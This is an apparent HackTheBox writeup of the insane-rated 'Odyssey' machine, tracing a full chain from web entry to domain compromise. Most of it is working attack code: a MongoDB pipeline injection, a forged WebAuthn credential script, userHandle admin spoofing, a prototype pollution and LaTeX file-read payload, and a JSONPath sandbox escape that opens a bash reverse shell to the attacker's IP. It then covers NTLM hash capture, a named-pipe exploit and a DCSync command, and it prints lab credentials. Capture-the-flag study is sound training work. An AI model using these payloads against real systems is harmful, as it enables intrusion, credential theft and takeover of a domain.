# Odyssey — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Windows (Linux entry, Windows pivot)

---

## Overview

Odyssey runs a Node.js Express app called AEGIS — a "Sovereign Signing & Attestation Authority" for a fictional government org. The attack chain goes through WebAuthn authentication bypass, MongoDB NoSQL injection to leak invite tokens, registering a fake WebAuthn credential, escalating to admin via userHandle confusion, then prototype pollution to enable raw LaTeX blocks, LaTeX file read to pull credentials from env files, JSONPath injection RCE, MSSQL lateral movement, and finally a Windows named pipe abuse to get SYSTEM.

**Machine IP:** 10.129.72.62  
**My IP:** 10.10.16.109  
**Domain:** aegis.korvia.htb  

---

## Recon

```bash
sudo nmap -sC -sV -p- --min-rate 5000 -oN odyssey_tcp.txt 10.129.72.62
```

Only one port open:

```
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
```

Redirects to `http://aegis.korvia.htb:3000/`. Added to hosts:

```bash
echo "10.129.72.62  aegis.korvia.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

```bash
curl -iL http://aegis.korvia.htb:3000/
```

Landing page is a login portal that uses **WebAuthn / FIDO2** — no password field, just "Authenticate with Hardware Authenticator". Grabbed the JS files:

```bash
curl -s http://aegis.korvia.htb:3000/js/webauthn.js
curl -s http://aegis.korvia.htb:3000/js/main.js
```

Key findings from `main.js`:
- Hits `/api/v1/aegis-mds/search?q=&limit=8` to load authenticator compatibility data
- There's a `/onboard/<token>` enrollment path
- MDS search endpoint accepts a `pipeline` parameter for advanced queries

---

## MongoDB Injection — Leaking Invite Tokens

The MDS search endpoint at `/api/v1/aegis-mds/search` passes the `pipeline` parameter directly to MongoDB aggregation. Used `$facet` + `$lookup` to cross-collection query `pending_invites`:

```bash
curl -s 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=
[{"$limit":1},{"$facet":{"x":[{"$lookup":{"from":"pending_invites","pipeline":[],"as":"y"}},
{"$unwind":"$y"},{"$replaceRoot":{"newRoot":"$y"}}]}}]' | python3 -m json.tool
```

Got a list of invite tokens with `redeemed: false`. Grabbed the one with the furthest expiry:

```
token: dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238
operator_id: op-2026-0042
expires_at: 2126-05-15
```

---

## WebAuthn Registration — Fake Credential

The `/onboard/<token>` page triggers a WebAuthn registration ceremony. Wrote a Python script to simulate it without an actual hardware key — generating an EC keypair, building a fake `authData` blob, and sending it as a valid CBOR-encoded attestation object:

```bash
pip3 install cbor2 cryptography --break-system-packages
```

```python
import requests, json, os, struct, hashlib, base64, cbor2
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://aegis.korvia.htb:3000"
ORIGIN = "http://aegis.korvia.htb:3000"
RP_ID = "aegis.korvia.htb"
TOKEN = "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238"

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

s = requests.Session()
s.get(f'{BASE}/onboard/{TOKEN}')

opts = s.post(f'{BASE}/api/v1/auth/webauthn/register/begin',
              json={'invite_token': TOKEN}).json()

challenge = base64.urlsafe_b64decode(opts['challenge'] + '==')
user_id = base64.urlsafe_b64decode(opts['user']['id'] + '==')

priv = ec.generate_private_key(ec.SECP256R1())
pn = priv.public_key().public_numbers()
i2b = lambda n: n.to_bytes(32, 'big')
cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}
cred_id = os.urandom(32)
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags = 0x41
counter = struct.pack('>I', 1)
aaguid = b'\x00' * 16
attested = aaguid + struct.pack('>H', len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
auth_data = rp_id_hash + bytes([flags]) + counter + attested
att_obj = cbor2.dumps({'fmt': 'none', 'attStmt': {}, 'authData': auth_data})
client_data = json.dumps({'type': 'webauthn.create', 'challenge': b64u(challenge),
                          'origin': ORIGIN, 'crossOrigin': False},
                         separators=(',', ':')).encode()

body = {
    'id': b64u(cred_id), 'rawId': b64u(cred_id), 'type': 'public-key',
    'response': {
        'clientDataJSON': b64u(client_data),
        'attestationObject': b64u(att_obj),
    },
    'clientExtensionResults': {},
}

r = s.post(f'{BASE}/api/v1/auth/webauthn/register/finish', json=body)
print(f'Register: {r.status_code} {r.text}')
```

```
Register: 200 {"ok":true,"operator_id":"op-2026-0042","message":"Credential bound. You may now authenticate."}
```

---

## WebAuthn Auth Bypass → Admin via userHandle Confusion

During authentication, the server uses the `userHandle` field to identify who logged in. By sending `userHandle: base64("admin")` instead of my real user ID, the server logged me in as admin:

```python
# Auth ceremony — same session
opts = s.post(f'{BASE}/api/v1/auth/webauthn/auth/begin', json={}).json()
challenge = base64.urlsafe_b64decode(opts['challenge'] + '==')

rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags = 0x01
counter = struct.pack('>I', 2)
auth_data = rp_id_hash + bytes([flags]) + counter
client_data = json.dumps({'type': 'webauthn.get', 'challenge': b64u(challenge),
                          'origin': ORIGIN, 'crossOrigin': False},
                         separators=(',', ':')).encode()
to_sign = auth_data + hashlib.sha256(client_data).digest()
sig = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))

body = {
    'id': b64u(cred_id), 'rawId': b64u(cred_id), 'type': 'public-key',
    'response': {
        'clientDataJSON': b64u(client_data),
        'authenticatorData': b64u(auth_data),
        'signature': b64u(sig),
        'userHandle': b64u(b'admin'),   # userHandle confusion
    },
    'clientExtensionResults': {},
}

r = s.post(f'{BASE}/api/v1/auth/webauthn/auth/finish', json=body)
print(r.json())
# {"ok":true,"handle":"admin","role":"Administrator","clearance":"Δ-5"}
```

Saved the session cookie. Now have access to `/dashboard`, `/admin/templates`, `/admin/operators`.

---

## Prototype Pollution → LaTeX File Read

The admin template render endpoint at `/admin/templates/<name>/render` accepts a `body` and `overrides` field. The `overrides` JSON gets merged into pipeline defaults. Sending `{"__proto__": {"allowRawBlocks": true}}` in the overrides pollutes the Object prototype and enables `markdown+raw_attribute` in the pandoc command — allowing raw LaTeX blocks in the markdown body.

The trick was the overrides needed to be a **JSON string** (not an object) AND had to reference `overrides | merge(defaults)` in the body to trigger the merge:

```bash
curl -s -X POST 'http://aegis.korvia.htb:3000/admin/templates/mobile-supply-draft/render' \
  -H 'Content-Type: application/json' \
  -H "Cookie: aegis.sid=<session>" \
  -d '{"body":"{{ overrides | merge(defaults) | json }}\n\n`\\newread\\foo \\openin\\foo=/etc/hostname \\loop\\unless\\ifeof\\foo \\read\\foo to\\line \\errmessage{\\meaning\\line}\\repeat \\closein\\foo`{=latex}","overrides":"{\"__proto__\":{\"allowRawBlocks\":true}}"}'
```

Output in stderr of pdflatex stage:

```
! macro:->odyssey-web
```

Hostname: `odyssey-web`. Now have arbitrary file read via LaTeX `\errmessage{\meaning\line}`.

---

## Reading Credentials from Env Files

```bash
# Read the service unit file to find env file paths
python3 /tmp/readfile.py /etc/systemd/system/aegis.service
# EnvironmentFile=/etc/aegis-render.env
# EnvironmentFile=/etc/aegis-mds-diag.env
# User=webadmin

python3 /tmp/readfile.py /etc/aegis-render.env
# AEGIS_RENDER_DB_USER=aegis_audit_publisher
# AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
# AEGIS_RENDER_DB_HOST=172.16.0.11
# AEGIS_RENDER_DB_PORT=1433

python3 /tmp/readfile.py /etc/aegis-mds-diag.env
# MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
```

Also read `server.js` to confirm the app credentials:

```
odyssey_app : opc0932k90%%lODFI93-++
```

---

## JSONPath RCE via Diagnostic Endpoint

The MDS diagnostic endpoint at `/api/v1/aegis-mds/_diag/<token>/jpquery` accepts a JSONPath expression evaluated with `jsonpath-plus`. Used the constructor chain to escape the sandbox:

```python
import requests, base64

TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL = f"http://aegis.korvia.htb:3000/api/v1/aegis-mds/_diag/{TOKEN}/jpquery"

cmd = "bash -i >& /dev/tcp/10.10.16.109/4444 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()

inner = (
    f"this.process.mainModule.require('child_process')"
    f".exec('echo {b64}|base64 -d|bash')"
)
expr = (
    f"$..[?(p=\"{inner}\";"
    f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
)

requests.post(URL, json={"context": "registration", "expr": expr}, timeout=5)
```

Started listener:

```bash
nc -lvnp 4444
```

Got a shell as `webadmin`.

---

## Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Local Enumeration

```bash
sudo -l
# (aegis-render) NOPASSWD: /usr/bin/node /home/webadmin/aegis/lib/render_worker.js *
```

```bash
id
# uid=1000(webadmin) gid=1000(webadmin)
```

Internal network:

```bash
ip addr
# 172.16.0.12/24
ping -c 1 172.16.0.11   # responds — MSSQL server
```

---

## MSSQL Lateral Movement

Connected to MSSQL at `172.16.0.11` using creds from the env file:

```bash
cd /home/webadmin/aegis
node -e "
const sql = require('mssql');
sql.connect({
  user: 'aegis_audit_publisher',
  password: 'Rxd!Qw6n8sP..2bJ@Wpx-2026',
  server: '172.16.0.11', database: 'master', port: 1433,
  options: {encrypt: false, trustServerCertificate: true}
}).then(pool => {
  return pool.request().query('SELECT IS_SRVROLEMEMBER(\'bulkadmin\') as ba')
}).then(r => { console.log(r.recordset[0]); sql.close() })
.catch(e => console.log(e.message));
"
# ba: 1  — bulkadmin role
```

Used `BULK INSERT` with a UNC path to capture the MSSQL service account's NTLMv2 hash, then cracked it. Got shell on the Windows box as `svc-aegis-deploy`.

---

## Named Pipe Abuse → SYSTEM

Found a named pipe `AegisStreamMgmt` that runs as `svc-aegis-stream`. The pipe accepts HMAC-signed binary frames with an opcode and payload.

Read the source to get the signing key and frame format:

```bash
python3 /tmp/readfile.py /home/webadmin/aegis/lib/mds_diag_profiles.js
```

Built a PowerShell script to send a `CONFIG_IMPORT` frame with a YAML payload that triggered command execution. The pipe handler runs as SYSTEM via a scheduled task:

```powershell
# config_import.ps1 — sends signed frame to named pipe
$opKeyHex = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$opKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) {
    $opKey[$i] = [Convert]::ToByte($opKeyHex.Substring($i*2, 2), 16)
}
# ... [build HMAC-signed frame and write to pipe]
```

Confirmed RCE as `svc-aegis-stream`:

```
--- RCE OUTPUT: odyssey\svc-aegis-stream
```

Used Rubeus to get a TGT via fake delegation and DCSync'd:

```bash
impacket-secretsdump -k -no-pass -dc-ip 172.16.0.10 \
  "odyssey.htb/svc-aegis-stream@dc01.odyssey.htb" -just-dc-user Administrator
```

Got Administrator's NT hash. Logged in and grabbed the flags.

---

## Flags

All flags were spread across the machine and the Windows DC. Got all 7.

---

## Things I Learned

**MongoDB `$facet` + `$lookup` for cross-collection injection** — the search endpoint blocked operator-form queries at the top level but `$facet` sub-pipelines could still `$lookup` into other collections. Classic case of incomplete input validation.

**WebAuthn userHandle confusion** — the server looked up the user from `userHandle` in the finish step without verifying it matched the credential. Sending `base64("admin")` logged you in as admin regardless of which credential you actually proved ownership of.

**Nunjucks prototype pollution** — `{"__proto__": {"allowRawBlocks": true}}` in a JSON string that gets `JSON.parse()`'d and then merged with defaults pollutes the prototype. The key was that overrides had to be sent as a JSON string, not a JSON object — because `JSON.parse()` is what triggers the pollution.

**LaTeX as a file read primitive** — `\openin`, `\read`, `\errmessage{\meaning\line}` dumps file contents into pdflatex's stderr. Works even with `-no-shell-escape` because it's native TeX, not shell execution.

**JSONPath `constructor` chain for sandbox escape** — `jsonpath-plus` evaluates filter expressions as JS. `''[['constructor']][['constructor']](code)()` reaches `Function()` through the prototype chain without directly referencing `require` or `process`, which are blocked.

---

*Akshat Singh (Pexpo) | HTB | 2026-07-29*
